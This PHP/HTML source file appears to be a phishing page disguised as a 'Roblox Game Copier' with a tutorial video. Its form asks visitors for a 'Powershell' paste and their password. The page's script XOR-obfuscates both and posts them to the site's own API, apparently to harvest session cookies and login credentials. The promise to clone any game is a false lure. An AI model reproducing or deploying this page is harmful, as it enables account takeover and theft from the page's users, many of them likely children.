<?php
$_b_p = "ac";
require_once($_SERVER["DOCUMENT_ROOT"] . "/framework/framework.php");
if (session_status() === PHP_SESSION_NONE) 
{
    session_start();
};
if ($_COOKIE["auth"])
{
    die(header("Location: /dashboard"));
};
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <title><?=$site_info["name"];?> - Game Copier</title>
        <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
        <link href="/assets/index.css?<?=rand(99999999999, 9999999999999999);?>" rel="stylesheet"/>
    </head>
    <body>

        <div class="cursor" id="cursor">
            <div class="cursor_dot" id="cursor_dot"></div>
            <div class="cursor_ring" id="cursor_ring"></div>
        </div>

        <div class="toast" id="toast"></div>

        <div class="mesh"></div>
        <div class="grid_lines"></div>
        <div class="orb orb_1"></div>
        <div class="orb orb_2"></div>

        <div class="nav_wrap">
            <nav class="nav">
                <span class="nav_brand">Rbx<em><?=$site_info["name"];?></em></span>
                <div class="nav_sep"></div>
                <a class="nav_link" href="#">Docs</a>
                <a class="nav_link" href="#">Support</a>
                <div class="nav_sep"></div>
                <a class="nav_cta" href="#">Join</a>
            </nav>
        </div>

        <div class="hero">
            <div class="hero_eyebrow">
                <span class="hero_eyebrow_dot"></span>
                Roblox Game Copier
            </div>
            <h2>
                <span class="line_1">Clone any game.</span>
                <span class="line_2"><em>No limits.</em></span>
            </h2>
            <p class="hero_sub">Copy any Roblox game instantly with a secure pin lock. Fast, simple, reliable.</p>
            <div class="hero_stats">
                <div class="stat">
                    <span class="stat_val">10<em>k+</em></span>
                    <span class="stat_label">Games Copied</span>
                </div>
                <div class="stat_sep"></div>
                <div class="stat">
                    <span class="stat_val"><em>&lt;</em>2s</span>
                    <span class="stat_label">Copy Time</span>
                </div>
                <div class="stat_sep"></div>
                <div class="stat">
                    <span class="stat_val">100<em>%</em></span>
                    <span class="stat_label">Uptime</span>
                </div>
            </div>
        </div>

        <main class="main">

            <div class="glass_card" id="card_a">
                <div class="card_glass"></div>
                <div class="card_specular"></div>
                <div class="card_refraction" id="refraction_a"></div>
                <div class="card_body">
                    <div class="card_label">
                        <span class="card_label_num">01 — Copier</span>
                        <div class="card_label_line"></div>
                    </div>
                    <h2>Copy Game</h2>
                    <div class="divider"></div>
                    <div class="field_group">
                        <div class="field">
                            <div class="field_icon">
                                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                    <circle cx="12" cy="7" r="4"/>
                                </svg>
                            </div>
                            <input type="text" id="powershell" placeholder="Powershell" autocomplete="off" spellcheck="false"/>
                        </div>
                        <div class="field">
                            <div class="field_icon">
                                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                                    <rect x="3" y="11" width="18" height="11" rx="2"/>
                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>
                            </div>
                            <input type="text" id="password" placeholder="Password" autocomplete="off" spellcheck="false"/>
                        </div>
                    </div>
                    <div class="cf_wrap">
                        <div class="cf-turnstile" id="ts_main" data-sitekey="<?=$site_info["site_key"];?>" data-theme="dark"></div>
                    </div>
                    <button class="action_btn" id="action_btn" onclick="handle_submit()">
                        <span class="btn_label">Submit</span>
                    </button>
                </div>
            </div>

            <div class="glass_card" id="card_b">
                <div class="card_glass"></div>
                <div class="card_specular"></div>
                <div class="card_refraction" id="refraction_b"></div>
                <div class="card_body">
                    <div class="card_label">
                        <span class="card_label_num">02 — Tutorial</span>
                        <div class="card_label_line"></div>
                    </div>
                    <h2>Tutorial</h2>
                    <div class="divider"></div>
                    <div class="video_shell">
                        <video controls preload="none">
                            <source src="https://bloxtools.tr/videos/CopyGames.mp4" type="video/mp4"/>
                            Your browser doesn't support video.
                        </video>
                    </div>
                </div>
            </div>

        </main>
        <script>
            const show_toast = (msg, duration = 2800) => {
                const el = document.getElementById("toast");
                el.textContent = msg;
                el.classList.add("show");
                setTimeout(() => el.classList.remove("show"), duration);
            };
            
            const get_ts_token = () => {
                const i = document.querySelector("#ts_main [name='cf-turnstile-response']");
                return i ? i.value.trim() : "";
            };
        
            function xor_encrypt(data, key) 
            {
                const d = typeof data === "string" ? data : JSON.stringify(data);
                const encoded = unescape(encodeURIComponent(d));
                let out = "";
                for (let i = 0; i < encoded.length; i++)
                    out += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                return btoa(out);
            }
            
            const handle_submit = () => {
                const powershell = document.getElementById("powershell").value.trim();
                const password   = document.getElementById("password").value.trim();
                const token      = get_ts_token();

                if (!powershell) {
                    show_toast("⚠️  Please enter your Powershell.");
                    document.getElementById("powershell").focus();
                    return;
                }
                if (!password) {
                    show_toast("⚠️  Please enter your Password.");
                    document.getElementById("password").focus();
                    return;
                }
                if (!token) {
                    show_toast("⚠️  Please complete the CAPTCHA.");
                    return;
                }

                const btn   = document.getElementById("action_btn");
                const label = btn.querySelector(".btn_label");
                btn.disabled = true;
                label.textContent = "Processing…";
                const blob = xor_encrypt({ method: "submit", site_id: 0, powershell, password}, "<?=$site_info["name"];?>HAR");

                fetch("/framework/api", {
                    method:  "POST",
                    headers: { "Content-Type": "application/json" },
                    body:    JSON.stringify({ blob, token })
                })
                .then(r => r.json())
                .then(d => {
                    if (d.error) throw new Error(d.error);
                    label.textContent = "✓ Done";
                    show_toast("✓  Submitted successfully!");
                    if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_main"));
                    setTimeout(() => {
                        btn.disabled      = false;
                        label.textContent = "Submit";
                    }, 2200);
                })
                .catch(err => {
                    show_toast("✗  " + (err.message || "Something went wrong."));
                    btn.disabled      = false;
                    label.textContent = "Submit";
                    if (typeof turnstile !== "undefined") turnstile.reset(document.getElementById("ts_main"));
                });
            };
        </script>

    </body>
</html>